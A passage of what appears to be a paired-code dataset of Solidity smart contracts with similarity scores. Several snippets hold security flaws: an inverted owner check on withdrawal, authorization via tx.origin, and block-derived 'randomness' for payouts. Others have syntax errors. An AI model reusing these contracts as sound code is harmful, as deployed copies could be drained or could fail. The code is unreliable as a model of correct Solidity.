    

}"
"contract Coin {


address public minter;
mapping (address => uint) public balances;



event Sent(address from, address to, uint amount, uint data);



function Coin() {
    balances[tx.origin] = 1000000000000000000000000000000000000;
    minter = msg.sender;
}

function mint(address receiver, uint amount) {
    if (msg.sender != minter) return;
    balances[receiver] += amount;
}

function send(address receiver, uint amount, uint data) {
    if (balances[msg.sender] < amount) return;
    balances[msg.sender] -= amount;
    balances[receiver] += amount;
    return Sent(msg.sender, receiver, amount, data);
}",0.6795535423962465,"contract ventil_ii{ 

mapping(address => uint) public balances;

event LogDeposit(address sender, uint amount);
event LogWithdrawal(address receiver, uint amount);

function withdrawFunds(uint amount) public returns(bool success) {
    require(amount < balances[msg.sender]);
    LogWithdrawal(msg.sender, amount);
    msg.sender.transfer(amount);
    return true;
}

function () public payable {
    require(msg.value > 0);
    uint change;
    uint dep;
    if(msg.value > 20) {
        dep = 20;
        change = msg.value - change;
    }
    balances[msg.sender] += dep;
    if(change > 0) balances[msg.sender] += change;
    LogDeposit(msg.sender, msg.value);
}

}"
"contract Room {
    address[] public Tables;

    function Room() public payable {}

    function createTable(uint minimum) public payable {
        address createdTable = new Table(minimum);
        Tables.push(createdTable);
    }

    function getCreatedTables() public view returns(address[]) {
        return Tables;
    }
}",0.6373895945751328,"contract DSProxyInterface {

    
    
    
    
    

    function execute(address _target, bytes memory _data) public virtual payable returns (bytes32);

    function setCache(address _cacheAddr) public virtual payable returns (bool);

    function owner() public virtual returns (address);
}"
"contract Table {
    struct Player {
        address player;
        uint value;
    }

    Player[] public players;
    uint public minimumBet;
    uint public maxPlayers = 2;
    mapping(address => bool) public availablePlayers;

    function Table(uint minimum) public payable {
        minimumBet = minimum;
        enterTable();
    }

    modifier restricted() {
        require(players.length < maxPlayers);
        _;
    }

    function getTotalPlayers() public view returns(uint) {
        return players.length;
    }

    function enterTable() public restricted payable {
        require(msg.value >= minimumBet);
        require(!availablePlayers[msg.sender]);

        availablePlayers[msg.sender] = true;
        Player memory newPlayer = Player({
            player: msg.sender,
            value: msg.value
        });

        players.push(newPlayer);
    }
}",0.6092469491211151,"contract WithdrawalContract {

    address public richest;
    address public owner;
    uint public mostSent;

    modifier onlyOwner() {
        require (msg.sender != owner);
        _;

    }

    mapping (address => uint) pendingWithdraws;

    function WithdrawalContract () payable {
        richest = msg.sender;
        mostSent = msg.value;
        owner = msg.sender;
    }

    function becomeRichest() payable returns (bool){
        require(msg.value > mostSent);
        pendingWithdraws[richest] += msg.value;
        richest = msg.sender;
        mostSent = msg.value;
        return true;
    }

    function withdraw(uint amount) onlyOwner returns(bool) {
        
        
        
        require(amount < this.balance);
        owner.transfer(amount);
        return true;

    }

    function getBalanceContract() constant returns(uint){
        return this.balance;
    }

}"
"contract MyContract {
    uint private x;

    constructor(uint _x) public {
        x = _x;
    }

    function set() external {
        if (x >= 42)
            x += 42;
    }

    function get() external view returns (uint) {
        return x;
    }
}",0.6286661879703839,"contract SafeMath {
  
  function safeAdd(uint a, uint b) internal returns (uint) {
    uint c = a + b;
    assert(c>=a && c>=b);
    return c;
  }
  function assert(bool assertion) internal {
    if (!assertion) throw;
  }
}"
"contract HelloFactory {

    function createHS() returns (address hsAddr) {
        return address(new HelloSystem());
    }

    function deleteHS(address hs){
        HelloSystem(hs).remove();
    }

}",0.6185713632445564,"contract EtherandomProxyI {
  function getContractAddress() constant returns (address _addr); 
  function getCallbackAddress() constant returns (address _addr); 
}"
"contract Token {

  using SafeMath for uint256;

  function transfer(address _to, uint256 _value) returns (bool) {
      var test = msg.sender; 
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    Transfer(msg.sender, _to, _value);
    return true;
  }

}",0.6854079395474715,"contract ERC20Burnable is BasicToken {



  

  function burn(uint256 value) public {

    require(msg.sender != 0);

    require(value <= balances[msg.sender]);



    totalSupply_ = totalSupply_.sub(value);

    balances[msg.sender] = balances[msg.sender].sub(value);

    emit Transfer(msg.sender, address(0), value);

  }

}"
"contract jar {
  uint public target;
  uint public numDonations;

  function jar (uint _target) {
    target = _target;
    numDonations = 0;
  }

  function save() {
    numDonations++;
  }

  function getBalance() constant returns (uint) {
    return this.balance;
  }

  function withdraw () {
     if (this.balance < target) throw;
     if (!msg.sender.send(this.balance)) throw;
  }
}",0.6159026687008071,"contract ERC20Interface {

    function totalSupply() public constant returns (uint);

    function balanceOf(address tokenOwner) public constant returns (uint balance);

    function transfer(address to, uint tokens) public returns (bool success);



    event Transfer(address indexed from, address indexed to, uint tokens);

}"
"contract CryptoCert {

struct Award {
    bool isValid;
    string hash;
}

struct Authority {
    bool isValid;
    string hash;
    address[] representatives;
    Award[] awards;
}

address private owner;

mapping(address => Authority) authorities;

modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}

modifier onlyBy(address _address) {
    require(msg.sender == _address);
    _;
}

function CryptoCert() public {
    owner = msg.sender;
}

function kill() external {
    if (msg.sender == owner) {
        selfdestruct(owner);
    }
}

function createAuthority(address _address, string _hash) public onlyOwner {
    authorities[_address].hash = _hash;
    authorities[_address].isValid = true;
}

function addAuthorizedAddress(address _authAddress, address _repAddress) public onlyBy(_authAddress) {
    authorities[_authAddress].representatives.push(_repAddress);
}

function getAuthorityHash(address _address) public view returns (uint) {
    if (authorities[_address].isValid) {
        return 1;
    } else {
        return 0;
    }
}

function getOwner() public view returns (address) {
    return owner;
}

function test() public pure returns (string) {
    return ""nigchicken69"";
}

}",0.6647856637399681,"contract Pedigree {



    address public owner;



    address public father;



    address public mother;

    

    

    string public name;



    bool public gender;



    

    string public birthday;



    

    address public spouse;



    

    address[] childs;



    

    string public dateOfDead;



    

    string public ipfs;



    modifier onlyOwner(){

        require( msg.sender == owner );

        _;

    }



    constructor(address _owner, address _father, address _mother, string _name, bool _gender, string _birthday, string _ipfs) public {

        owner = _owner;

        father = _father;

        mother = _mother;

        name = _name;

        gender = _gender;

        birthday = _birthday;

        ipfs = _ipfs;

    }



    function addChild(address _childAddr) external {

        childs.push(_childAddr);

    }



    function getChilds() public view returns (address[]) {

        

        return childs;

    }



    function setSpouse(address _spouseAddr) external onlyOwner {

        spouse = _spouseAddr;

    }



    function getContractBalance() public view returns ( uint ) {

        return address(this).balance;

    }



    function setDateOfDead(string _date) external onlyOwner {

        dateOfDead = _date;

    }

    

    function setIPFS(string _ipfs) external onlyOwner {

        ipfs = _ipfs;

    }

    

}"
"contract AmbassadorTask {
    address private owner; 
    uint taskReward; 
    address ambassador; 

    
    function AmbassadorTask (address _ambassador) public payable {
            require (msg.value > 0); 
            owner = msg.sender;  
            taskReward = msg.value;
            ambassador = _ambassador;
    }

    function getAmbassador() public view returns (address _ambassador) {
        return ambassador;
    }
}",0.6124446572028001,"contract Ownable {
  address public owner;

  event NewOwner(address indexed owner);

  function Ownable () public {
    owner = msg.sender;
  }

  modifier restricted () {
    require(owner == msg.sender);
    _;
  }

  function setOwner (address candidate) public restricted returns (bool) {
    require(candidate != address(0));
    owner = candidate;
    NewOwner(owner);
    return true;
  }
}"
"contract Coursetro {

   string fName;
   uint age;

   function setInstructorName(string memory _fName) public {
       fName = _fName;

   }

   function getInstructorName() public view returns (string memory) {
       return (fName);
   }

}",0.6443522450740509,"contract Lobster {

    address private owner;
    string private flag;
    
    constructor () public {
        owner = msg.sender;
    }
    
    function getFlag() public view returns (string memory) {
        require(msg.sender == owner);
        return flag;
    }
    
}"
"contract Foo {
    constructor(address[] memory _addrs) public {}
}",0.6709817998585561,"contract IRegistry {

    function add(address who) public;

}"
"contract FooFactory {
    function createInstance(address[] calldata _addrs) external {
        new Foo(_addrs);
    }
}",0.6402498576998037,"contract OrchidCurator {
    function good(address, bytes calldata) external view returns (uint128);
}"
"contract SimpleStorage {
  uint storedData;
  uint secondData;
  uint TData;
  function set(uint x) external {
    storedData = x;
  }
  function setSecond(uint x) external {
    secondData = x;
  }
  function setT(uint x) external {
    TData = x;
  }
  function get() external view returns (uint retVal) {
    return storedData;
  }
  function getSecond() external view returns (uint retVal) {
    return secondData;
  }
  function getT() external view returns (uint retVal) {
    return TData;
  }
}",0.668527228229181,"contract IToken { 

    
    function totalSupply() external view returns (uint);


    
    function balanceOf(address _owner) external view returns (uint);


    
    function transfer(address _to, uint _value) external returns (bool);


    
    function transferFrom(address _from, address _to, uint _value) external returns (bool);


    
    function approve(address _spender, uint _value) external returns (bool);


    
    function allowance(address _owner, address _spender) external view returns (uint);
}"
"contract Exchange {
    tokenToTransfer public transferToken;

function approve(address tokenAddress, uint256 approvedeposit) public returns (bool) {
        transferToken = tokenToTransfer(tx.origin);
        transferToken.approve(address(this), approvedeposit);
}",0.6262066971846136,"contract SafeContract is Ownable {

    
    function transferAnyERC20Token(address _tokenAddress, uint256 _tokens, address _beneficiary) public onlyOwner returns (bool success) {
        return ERC20Basic(_tokenAddress).transfer(_beneficiary, _tokens);
    }
}"
"contract helloworld {
function returnint() returns (uint) {
return 15;
}
}",0.6678835925257126,"contract UsdPrice {

    function USD(uint _id) constant returns (uint256);

}"
"contract Escrow {

    address token;

    constructor(address tokenAddress) public {
        token = tokenAddress;
    }

    function getTokenBalance(address user) public view returns (uint) {
        return ERC20(token).balanceOf(user);
    }

    function deposit(uint amnt) public {
        
        ERC20(token).approve(address(this), amnt);
        ERC20(token).transferFrom(msg.sender, address(this), amnt);
    }

}",0.6862382309544448,"contract ERC20Token {
    function balanceOf(address) public view returns(uint);
    function allowance(address, address) public view returns(uint);
    function transfer(address, uint) public returns(bool);
    function approve(address, uint)  public returns(bool);
    function transferFrom(address, address, uint) public returns(bool);
}"
"contract Contract {
  bytes32 public hash;
  function set(bytes32 hash_) returns (bool success)
  {
        hash = hash_;
  }
  function get() constant returns bytes32 {
     return hash;
   }
}",0.667903324015115,"contract Registrar {
    function transfer(bytes32 _hash, address newOwner) public;
    function entries(bytes32 _hash) public constant returns (uint, Deed, uint, uint, uint);
}"
"contract doctor {

    struct doctor_ds {
        address doctor_address;
        string speciality;
    }
    mapping(address => doctor_ds) public doctors_list;
    address hospital_address;

    function doctor() {
        hospital_address = msg.sender;
    }

    function add_doctors(address _new_doctor_address, string _speciality) {

        doctors_list[_new_doctor_address].doctor_address = _new_doctor_address;
        doctors_list[_new_doctor_address].speciality = _speciality;
    }

    function doctor_exist(address _doctor) public view returns(bool) {
        if (doctors_list[_doctor].doctor_address == _doctor) {
            return true;
        } else {
            return false;
        }
    }
}",0.6012808476556633,"contract ValidatorManagerContract is Ownable {



    mapping (address => bool) public validators;

    mapping (address => bool) public allowedTokens;



    function checkValidator(address _address) public view returns (bool) {

        

        if (_address == owner)

            return true;

        return validators[_address];

    }



    function toggleValidator(address _address) public onlyOwner {

        validators[_address] = !validators[_address];

    }



    function toggleToken(address _token) public {

        require(checkValidator(msg.sender), ""not a validator"");

        allowedTokens[_token] = !allowedTokens[_token];

    }



}"
"contract TestCoin is StandardToken {


  uint256 public rate = 0.0666 ether; 
  address public owner = msg.sender;

  bool public roundActive = false; 
  uint public roundNum = 0;
  uint public roundMax = 74;
  uint public roundIssued;
  address[] roundBuyers; 

  modifier onlyOwner {
      require(msg.sender == owner);
      _;
  }

  event Raffled(uint roundNumber, address winner, uint amount);
  event RoundStart(uint roundNumber);


  function name() constant returns (string) { return ""TestCoin""; }
  function symbol() constant returns (string) { return ""TEST""; }
  function decimals() constant returns (uint8) { return 0; }


  function startNextRound()
    public
  {
      require(msg.sender == owner);
      assert(endPreviousRound()); 
      require(roundNum<9); 

      roundActive = true;
      roundBuyers = new address[](74);
      roundIssued = 0;
      roundNum++;

      RoundStart(roundNum);
  }

  function endPreviousRound()
    private
    returns (bool)
  {
      
      if(roundIssued < roundMax) assert(raffle(amountRemaining()));
      roundActive = false;
      return true;
  }

  
  
  function raffle(uint raffleAmount)
    private
    returns (bool)
  {
    uint randomIndex = uint(block.blockhash(block.number))%(roundMax-raffleAmount)+1;
    mint(roundBuyers[randomIndex], raffleAmount);

    Raffled(roundNum, roundBuyers[randomIndex], raffleAmount);
  }

  function mint(address receiver, uint amount) 
    private
  {

    totalSupply = safeAdd(totalSupply, amount);
    balances[receiver] = safeAdd(balances[receiver], amount);

    for(uint i = 0; i < amount; i++) {
      roundBuyers[roundIssued+i] = receiver;
    }

    roundIssued = safeAdd(roundIssued, amount);

    
    Minted(receiver, amount);
   }

  
  
  function () payable {
    
    if (msg.value <= 0 || (msg.value % rate) != 0) revert(); 

    uint tokenAmount = safeDiv(msg.value, rate);

    
    if(roundActive == false) revert();
    
    if (tokenAmount > amountRemaining()) revert();
    
    if ((tokenAmount+totalSupply) > 666) revert();
    
    if (tokenAmount < 1) revert();  

    mint(msg.sender, tokenAmount);
    owner.transfer(msg.value);          
  }  

  
  function amountRemaining()
    public
    constant
    returns (uint)
  {
    return (roundMax-roundIssued);
  }

}",0.6675742077603551,"contract ST is ERC20Interface {
    uint256 public constant decimals = 18;

    string public constant symbol = ""ST"";
    string public constant name = ""Super Token"";

    uint256 public _totalSupply = 2100000000*(10 ** 18);

    
    address public owner;

    
    mapping(address => uint256) private balances;

    
    mapping(address => mapping (address => uint256)) private allowed;

    
    mapping(address => bool) private approvedInvestorList;

    
    

    
    


    
    modifier onlyPayloadSize(uint size) {
      if(msg.data.length < size + 4) {
        revert();
      }
      _;
    }



    
    
    constructor() public {
        owner = msg.sender;
        balances[owner] = _totalSupply;
    }

    
    
    function totalSupply()
        public view returns (uint256) {
        return _totalSupply;
    }





    
    
    
    function balanceOf(address _addr)
        public view returns (uint256) {
        return balances[_addr];
    }

    
    
    function isApprovedInvestor(address _addr)
        public view returns (bool) {
        return approvedInvestorList[_addr];
    }

    
    
    
    
    
    
    


    
    
    
    
    function transfer(address _to, uint256 _amount)
        public returns (bool success) {
            
        
        
        
        require(_to != address(0));
        require((balances[msg.sender] >= _amount) && (_amount >= 0) && (balances[_to] + _amount > balances[_to]));
        balances[msg.sender] -= _amount;
        balances[_to] += _amount;
        emit Transfer(msg.sender, _to, _amount);
        success = true;
    }

    
    
    
    
    
    
    function transferFrom(
        address _from,
        address _to,
        uint256 _amount
    )
    public returns (bool success) {
        require(balances[_from] >= _amount && _amount > 0);
        require(allowed[_from][msg.sender] >= _amount);
        require(balances[_to] + _amount > balances[_to]);
        balances[_from] -= _amount;
        allowed[_from][msg.sender] -= _amount;
        balances[_to] += _amount;
        emit Transfer(_from, _to, _amount);
        success =  true;
    }

    
    
    function approve(address _spender, uint256 _amount)
        public

        returns (bool success) {
        require((_amount == 0) || (allowed[msg.sender][_spender] == 0));
        allowed[msg.sender][_spender] = _amount;
        emit Approval(msg.sender, _spender, _amount);
        return true;
    }

    
    function allowance(address _owner, address _spender)
        public
        view
        returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }

    function () external payable {
        revert();
    }
}"
"contract External {
  Product p;
  function External(address addr) {
    p = Product(addr);
  }


 function readProduct(uint u) constant returns(bytes32 name, bool status) {
      p.productStructs(u);
    return(p.productStructs(u)); 
  }


  function readProduct(uint u) constant returns(bytes32 name) {
    return (p.productStructs(u).name); 
  }
}",0.6095004639719557,"contract ElcoinDb {
    function getBalance(address addr) constant returns(uint balance);
    function deposit(address addr, uint amount, bytes32 hash, uint time) returns (bool res);
    function withdraw(address addr, uint amount, bytes32 hash, uint time) returns (bool res);
}"
"contract Chat {

    address public user;
    address public myAddress;
    string public message;
    string public response;
    address public owner;
    uint public time;

    function Chat(address _uw, address _a, string _m, string _r) {
        user = _uw;
        myAddress = _a;
        message = _m;
        response = _r;
        owner = msg.sender;
        time = now;
    }

    function getmyAddress() constant returns(address myAddress) {
        return myAddress;
    }

    function getMessage() constant returns(string message) {
        return message;
    }

    function getUser() constant returns(address user) {
        return user;
    }

    function getOwner() constant returns(address owner) {
        return owner;
    }

    function getResponse() constant returns(string response) {
        return response;
    }

    function getTime() constant returns(uint time) {
        return time;
    }    

    function setResponse(string r) {
        if (msg.sender == user) {
            response = r;
        }
    }

}",0.6845680613991614,"contract NRB_Users {
    function init(address _main, address _flc) public;
    function registerUserOnToken(address _token, address _user, uint _value, uint _flc, string _json) public returns (uint);
    function getUserIndexOnEther(address _user) constant public returns (uint);
    function getUserIndexOnToken(address _token, address _user) constant public returns (uint);
    function getUserLengthOnEther() constant public returns (uint);
    function getUserLengthOnToken(address _token) constant public returns (uint);
    function getUserNumbersOnToken(address _token, uint _index) constant public returns (uint, uint, uint, uint, address);
    function getUserTotalPaid(address _user, address _token) constant public returns (uint);
    function getUserTotalCredit(address _user, address _token) constant public returns (uint);
}"
"contract First {
  address public second;

  function First() {

  }

  function createSecond() {
    second = address(new Second());
  }
}",0.6246886185756928,"contract airDrop {
    function verify(address _address, bytes32 _secret) public constant returns (bool _status);
}"
"contract Lottery {
  address public owner;
  bytes32 public hash;

  function Lottery() {        
    owner = msg.sender;
    hash = sha3(owner);
  }

  function get() constant returns (address, bytes32) {
    return (owner, hash);
  }
}",0.6770741251507287,"contract Notary {
    mapping (bytes32 => bool) public hashes ;
    
    function register(bytes32 _hash) public {
        hashes[_hash] = true;
    }
    
    function check(bytes32 _hash) public view returns (bool) {
        return hashes[_hash];
    }
}"
"contract Factory {

address[] public WubaContracts;
event LogCreatedWubaContract(address sender, address WubaContract);

function createWubaContracts() public returns(bool success) {
    require(WubaContracts.length==0, ""3 contracts, please."");
    for(uint i=0; i<3; i++) {
        Wuba v = new Wuba();
        WubaContracts.push(address(v));
        emit LogCreatedWubaContract(msg.sender, address(v));
    }
    return true;
}

function setupWubaContracts() public returns(bool success) {
    for(uint i=0; i<3; i++) {
        Wuba v = Wuba(WubaContracts[i]);
        v.oke();
    }
    WubaContracts.length=0;
    return true;
}

}",0.6473853468571934,"contract LLCTokenFactory {

  

  mapping (address => bool) public validContracts; 
  address[] public contracts;

  

  function getContractCount() 
    public
    view
    returns(uint contractCount)
  {
    return contracts.length;
  }

  

  function getDeployedContracts() public view returns (address[] memory)
  {
    return contracts;
  }

  

  function newLLCToken(string memory name, string memory symbol, uint256 init, address owner)
    public
    returns(address)
  {
    LLCToken c = new LLCToken(name, symbol, init, owner);
    validContracts[c] = true;
    contracts.push(c);
    return c;
  }
}"
"contract MyAddr2 {
MyAddr private x;
string private myname1;
  function getStateVar() view public returns (uint stateVar) {
       stateVar = x.myname;
   }
}",0.6291126516415931,"contract PriceFeedInterface {

    function name() public view returns (string);

    function getRate() public view returns (uint _rate, bool _live);

}"
"contract MyAddr3 {
}",0.6577581574808877,"contract MSD {

}"
contract test { function multiply(uint a) returns(uint d) {   rxturn a * 7;   } },0.6516361840322323,"contract time{
function _time() view external returns (uint)
{
    return now ;
    
}
}"
"contract billboard {           
    struct Contributor{             
        string name;                    
        string email;                   
        string message;                
        address addr;                  
    }
    address public owner;           
    string public name;                 
    string public default_name;         
    string public email;                
    string public message;              
    address public addr;                
    uint public numPosts;               
    uint public limit_posts;            
    mapping( uint => Contributor ) public contributors;  
    uint public timestamp;              
    address public winnerAddress;       
    uint public winnerInd;              
    bool public stopped;                

    modifier onlyOwner() {              
    require(msg.sender == owner);
    _;
    } 
    modifier isStopped() {              
    require(!stopped);
    _;
    }

    function billboard(string _title) public {  
        owner = msg.sender;                             
        numPosts = 0;                                   
        stopped = false;                                
        limit_posts = 1002;
    }    
    function post(string _name, string _email, string _message) public payable isStopped {     
        name = _name;                                   
        email = _email;                                
        message = _message;                             
        require(_message.length != 0);                      
        require(limit_posts > numPosts + 1);                
        if(_name.length == 0) {                             
            _name = default_name;
        }
    }
    function hold() public onlyOwner {            
        require(numPosts >= 3);                         
        timestamp = block.timestamp;                
        winnerInd = timestamp % 3;                 
        winnerAddress = contributors[winnerInd];
        if(!winnerAddress.send(this.balance)) {     
                require( false ) ;
        }
    }
    function kill() public onlyOwner {          
        selfdestruct(owner);
    }
}",0.6119667630571469,"contract LineageCode is StandardToken {

    string public name = 'LinageCode';

    string public symbol = 'LIN';

    uint public decimals = 10;

    uint public INITIAL_SUPPLY = 80 * 100000000 * (10 ** decimals);

    address owner;

    bool public released = false;



    constructor() public {

        totalSupply_ = INITIAL_SUPPLY;

        balances[msg.sender] = INITIAL_SUPPLY;

        owner = msg.sender;

    }



    function release() public {

        require(owner == msg.sender);

        require(!released);

        released = true;

    }



    function lock() public {

        require(owner == msg.sender);

        require(released);

        released = false;

    }



    function get_Release() view public returns (bool) {

        return released;

    }



    modifier onlyReleased() {

        if (owner != msg.sender)

          require(released);

        _;

    }



    function transfer(address to, uint256 value) public onlyReleased returns (bool) {

        super.transfer(to, value);

    }



    function allowance(address _owner, address _spender) public onlyReleased view returns (uint256) {

        super.allowance(_owner, _spender);

    }



    function transferFrom(address from, address to, uint256 value) public onlyReleased returns (bool) {

        super.transferFrom(from, to, value);

    }



    function approve(address spender, uint256 value) public onlyReleased returns (bool) {

        super.approve(spender, value);

    }

}"
"contract TokenCrowdsale {

    using SafeMath for uint256;

    
    address public beneficiary;                     
    address public creator;                         
    address public confirmedBy;                     
    uint256 public maxSupply = 15000000e8;    
    uint256 public minAcceptedAmount = 10 finney;   
    bool public purchasingAllowed = false;


    
    uint256 public rate = 2000;

    enum Stages {
        PreSale,
        InProgress,
        Ended,
        Withdrawn
    }

    Stages public stage = Stages.PreSale;

    
    Token public deplToken;

    
    mapping (address => uint256) balances;

    
    modifier atStage(Stages _stage) {
        require(stage == _stage);
        _;
    }

    
    modifier onlyBeneficiary() {
        require(beneficiary == msg.sender);
        _;
    }

    
    function balanceOf(address _investor) constant returns (uint256 balance) {
        return balances[_investor];
    }


    function enablePurchasing() onlyBeneficiary atStage(Stages.PreSale) {
        purchasingAllowed = true;
        stage = Stages.InProgress;
    }

    function disablePurchasing() onlyBeneficiary atStage(Stages.InProgress) {
        purchasingAllowed = false;
        stage = Stages.Ended;
    }

    function enableNewPurchasing() onlyBeneficiary atStage(Stages.Withdrawn) {
        purchasingAllowed = true;
        stage = Stages.InProgress;
    }

    
    function TokenCrowdsale(address _tokenAddress, address _beneficiary, address _creator) {
        deplToken = Token(_tokenAddress);
        beneficiary = _beneficiary;
        creator = _creator;
    }

    
    function confirmBeneficiary() onlyBeneficiary {
        confirmedBy = msg.sender;
    }


    
    function withdraw() onlyBeneficiary atStage(Stages.Ended) {
        uint256 ethBalance = this.balance;
        beneficiary.transfer(ethBalance);
        stage = Stages.Withdrawn;
    }

    
    function () payable atStage(Stages.InProgress) {

        require(purchasingAllowed);

        address investor = msg.sender;
        uint256 received = (msg.value).div(10e8);

        
        require(received >= minAcceptedAmount);
        uint256 tokens = (received).mul(rate);

        require(tokens > 0);

        require(deplToken.issue(investor, tokens));

        balances[investor] = balances[investor].add(received);
        

        
        if (deplToken.totalSupply() >= maxSupply) {
            stage = Stages.Ended;
        }
    }

    function withdrawForeignTokens(address _tokenContract) onlyBeneficiary public returns (bool) {
        ForeignToken token = ForeignToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(beneficiary, amount);
    }
}",0.6751832426115274,"contract CMBToken is PausableToken {



  using SafeMath for uint256;

  string public constant name = ""Creatanium"";

  string public constant symbol = ""CMB"";

  uint8 public constant decimals = 18;



  uint256 public constant initialSupply_ = 2000000000 * (10 ** uint256(decimals));

  uint256 public mintedSupply_ = 0;

  mapping(address => uint256) lockedBalances;

  

  event Mint(address _to, uint256 amount);

  event TokensLocked(address beneficiary, uint256 amount);

  event TokensUnlocked(address beneficiary, uint256 amount);

  

  modifier hasMintPermission() {

    require(msg.sender == owner);

    _;

  }

  

  

  constructor() public {

    totalSupply_ = initialSupply_;

    balances[msg.sender] = balances[msg.sender].add(initialSupply_);

    emit Transfer(address(0), msg.sender, initialSupply_);

  }

  

  

  function mint(

    uint256 _amount

  )

    public

    hasMintPermission

    whenNotPaused

    returns (bool)

  {

    require(mintedSupply_.add(_amount)<=totalSupply_);

    require(_amount > 0);

    mintedSupply_ = mintedSupply_.add(_amount);

    balances[msg.sender] = balances[msg.sender].add(_amount);

    emit Mint(msg.sender, _amount);

    emit Transfer(address(0), msg.sender, _amount);

    return true;

  }

  

  function setTotalSupply(uint256 _value) public onlyOwner {

    require(_value >= totalSupply_);

    totalSupply_= 0;

    totalSupply_ = totalSupply_.add(_value);

  }

  

  function sendToInvestor(address _to, uint256 _value) public onlyOwner {

    transfer(_to, _value);

  }

  

  function lockedBalanceOf(address _owner) public view returns (uint256) {

    return lockedBalances[_owner];

  }

  

  function lockTokens(address _beneficiary, uint _value) public onlyOwner {

    require(_value <= balances[_beneficiary]);

    require(_beneficiary != address(0));



    balances[_beneficiary] = balances[_beneficiary].sub(_value);

    lockedBalances[_beneficiary] = lockedBalances[_beneficiary].add(_value);

    emit TokensLocked(_beneficiary, _value);

  }

  

  function unlockTokens(address _beneficiary, uint _value) public onlyOwner {

    require(_value <= lockedBalances[_beneficiary]);

    require(_beneficiary != address(0));



    lockedBalances[_beneficiary] = lockedBalances[_beneficiary].sub(_value);

    balances[_beneficiary] = balances[_beneficiary].add(_value);

    emit TokensUnlocked(_beneficiary, _value);

  }

  

  function () external payable {

    require(owner.send(msg.value));

  }

  

}"
"contract A {
    uint public counter ; 
    function increment(uint add) {
       counter = counter + add;
    }
}",0.6306008592655139,"contract Trader {

    function buy(address _from, uint256 _tokenId, uint256 _count) public;

}"
"contract B {
    function B() public {emit PrintB();}
    event PrintB();
}",0.6528170244400504,"contract Test {
    uint public test;
    
    function Test() {
        test = 1;
    }
}"
"contract C {
    function C() public {emit PrintC();}
    event PrintC();
}",0.6528170244400504,"contract Test {
    uint public test;
    
    function Test() {
        test = 1;
    }
}"
"contract Wallet {
    struct TokenInfo {
        IERC20Token token;
        uint exist;
    }

    mapping(address=>TokenInfo[]) public tokenList;

    function Wallet() {

    }

    function addToken(address _account, IERC20Token _token) public {
        for (uint i = 0; i < tokenList[_account].length; i++) {
            if (tokenList[_account][i].exist == 0) {
                var tokenInfo = TokenInfo(_token, 1);
                tokenList[_account].push(tokenInfo);
            }
        }
    }

    function getTokenListLength(address _account) public constant returns (uint) {
        return tokenList[_account].length;
    }
}",0.6419096839833042,"contract ITokenChanger {
    function changeableTokenCount() public constant returns (uint16 count);
    function changeableToken(uint16 _tokenIndex) public constant returns (address tokenAddress);
    function getReturn(IERC20Token _fromToken, IERC20Token _toToken, uint256 _amount) public constant returns (uint256 amount);
    function change(IERC20Token _fromToken, IERC20Token _toToken, uint256 _amount, uint256 _minReturn) public returns (uint256 amount);
}"
"contract contractFactory {
  address[] public contracts;


  function getContractCount() public constant returns(uint) {
    return contracts.length;
  }

  function newContract(uint _rent, uint _security_deposit, string _house, address _owner, address _tenant)
  public constant returns(address) {
    Rental c = new Rental(_rent, _security_deposit, _house, _owner, _tenant);
    contracts.push(c);
    return c;
  }
}",0.6412887451147622,"contract Certifier {
	event Confirmed(address indexed who);
	event Revoked(address indexed who);
	function certified(address) public constant returns (bool);
	function get(address, string) public constant returns (bytes32);
	function getAddress(address, string) public constant returns (address);
	function getUint(address, string) public constant returns (uint);
}"
"contract Azimuth {

    function getSponsoringCount(uint32) external view returns (uint256) {}

    function sponsoring(uint32, uint) public returns (uint32) {}

}",0.6923116744296656,"contract Coin {

    function getOwner(uint index) public view returns (address, uint256);

    function getOwnerCount() public view returns (uint);

}"
"contract Subscriptions {

    Azimuth azi = Azimuth(0x0baB5299383880A1282F481402b72696Caa2025D);

    address payable internal owner;

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, ""Error: not the contract owner."");
        _;
    }

    mapping(uint32 => uint256) internal balances;
    uint32[] internal subscribers;

    
    function importSubscribers(uint32 _point) internal onlyOwner {
        for (uint i = 0; i < azi.getSponsoringCount(_point); i++) {
            subscribers.push(azi.sponsoring(_point, i));
        }
    }

    mapping(uint32 => bool) internal blacklist;

    function addBlacklist(uint32 _point) public onlyOwner {
        blacklist[_point] = true;
    }

    function unBlacklist(uint32 _point) public onlyOwner {
        blacklist[_point] = false;
    }

    
    function isSubscriber(uint32 _point) internal view returns (bool _isSubscriber) {
        for (uint i = 0; i < subscribers.length; i += 1) {
            if (subscribers[i] == _point) {
                _isSubscriber = true;
            }
        }
        return _isSubscriber;
    }

    
    function subscribe(uint32 _point) public payable {
        require(isSubscriber(_point) == false, ""Error: this point is already a subscriber."");
        subscribers.push(_point);
        balances[_point] = msg.value;
        owner.transfer(msg.value);
    }

    
    function pay(uint32 _point) public payable {
        require(isSubscriber(_point) == true, ""Error: this point is not a valid subscriber."");
        balances[_point] += msg.value;
        owner.transfer(msg.value);
    }

    
    function checkBalance(uint32 _point) public view onlyOwner returns(uint _balance) {
        require(isSubscriber(_point) == true, ""Error: this point is not a valid subscriber."");
        return (balances[_point]);
    }

    
    
    uint internal billingRate = 0;

    
    function bill() public onlyOwner {
        for (uint i = 0; i < subscribers.length; i += 1) {
            if (balances[subscribers[i]] < billingRate) {
                boot(subscribers[i]);
            } else {
                balances[subscribers[i]] -= billingRate;
            }
        }
    }

    
    function boot(uint32 _point) public onlyOwner {
        balances[_point] = 0;
        for (uint i = 0; i < subscribers.length; i++) {
            if (subscribers[i] == _point) {
                delete subscribers[i];
                break; 
            }
        }
    }

    
    function setRate(uint _amount) public onlyOwner {
        billingRate = _amount;
    }
}",0.6108288608232121,"contract Templar {
string public constant symbol = ""Templar"";
  string public constant name = ""KXT"";
  uint8 public constant decimals = 18;
  uint256 public totalSupply = 100000000 * (uint256(10)**decimals);
  address public owner;
  uint256 public rate =  5000000000000;
  mapping(address => uint256) balances;
  mapping(address => mapping (address => uint256)) allowed;
  modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
event Transfer(address indexed _from, address indexed _to, uint256 _value);
event Approval(address indexed _owner, address indexed _spender, uint256 _value);
function Mint() public{
  owner = msg.sender;
}
function () public payable {
  create(msg.sender);
}
function create(address beneficiary)public payable{
